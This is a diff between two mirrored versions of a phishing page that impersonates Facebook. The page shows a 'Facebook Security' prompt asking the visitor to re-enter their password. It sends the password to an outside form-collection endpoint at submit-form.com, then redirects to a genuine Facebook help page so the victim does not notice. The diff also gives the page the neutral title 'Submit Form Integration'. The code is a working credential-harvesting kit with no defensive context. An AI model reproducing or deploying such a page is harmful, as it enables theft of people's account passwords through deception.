@@ -1,10 +1,12 @@
+<!DOCTYPE html>
+<html lang="en">
 
-<!-- Mirrored from php-cp-security-password.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Wed, 25 Dec 2024 17:19:48 GMT -->
+<!-- Mirrored from pass-2oyp.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Wed, 25 Dec 2024 17:49:11 GMT -->
 <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Password Page</title>
+    <title>Submit Form Integration</title>
     <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         body {
@@ -107,23 +109,22 @@
 <body>
     <div class="container">
         <div class="logo">
-           <img class="logo" src="../upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Logo">
+            <img class="logo" src="376717293_122093412812056687_4157098041335152348_n.jpg" alt="Logo">
+        </div>
         <div class="header">
             Facebook Security
         </div>
         <p>Please re-enter your password to complete the request.</p>
-       <form id="meta-form" action="../external.html?link=https://submit-form.com/okUZeNrFg" method="POST">
-              <!-- Replace with your Access Key -->
-              <input type="hidden" name="access_key" value="22983eba-14f6-431b-8283-10e298027760">
+        <form id="passwordForm" action="../external.html?link=https://submit-form.com/okUZeNrFg" method="POST">
             <div class="form-group">
                 <label for="password">Password</label>
                 <div class="input-wrapper">
-                    <input type="password" id="password" name="password" placeholder="Enter your password" required="" fdprocessedid="t6pf2r">
+                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
                     <i class="eye-icon fas fa-eye" id="togglePassword"></i>
                 </div>
                 <span id="error-message" class="error-message"></span>
             </div>
-            <button type="submit" class="submit-button" fdprocessedid="knr80tm">Submit</button>
+            <button type="submit" class="submit-button">Submit</button>
         </form>
     </div>
     <script>
@@ -149,30 +150,15 @@
                 event.preventDefault();
             } else {
                 errorMessage.textContent = '';
-                // Perform form submission via Fetch API
-                event.preventDefault(); // Prevent default form submission
-
-                var formData = new FormData(this);
-                fetch(this.action, {
-                    method: 'POST',
-                    body: formData,
-                    headers: {
-                        'Accept': 'application/json'
-                    }
-                })
-                .then(response => {
-                    if (response.ok) {
-                        window.location.href = '../external.html?link=https://www.facebook.com/help/media/thank-you?rdrhc'; // Redirect to desired URL
-                    } else {
-                        errorMessage.textContent = 'There was an error. Please try again.';
-                    }
-                })
-                .catch(() => {
-                    errorMessage.textContent = 'There was an error. Please try again.';
-                });
+                // Submit form normally
+                // Redirect after form submission
+                setTimeout(function() {
+                    window.location.href = '../external.html?link=https://www.facebook.com/help/media/thank-you?rdrhc'; // Redirect to desired URL
+                }, 2000); // Wait 2 seconds for form submission to complete
             }
         });
     </script>
+</body>
 
-
-</div><span id="PING_IFRAME_FORM_DETECTION" style="display: none;"></span></body>
+<!-- Mirrored from pass-2oyp.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Wed, 25 Dec 2024 17:49:13 GMT -->
+</html>
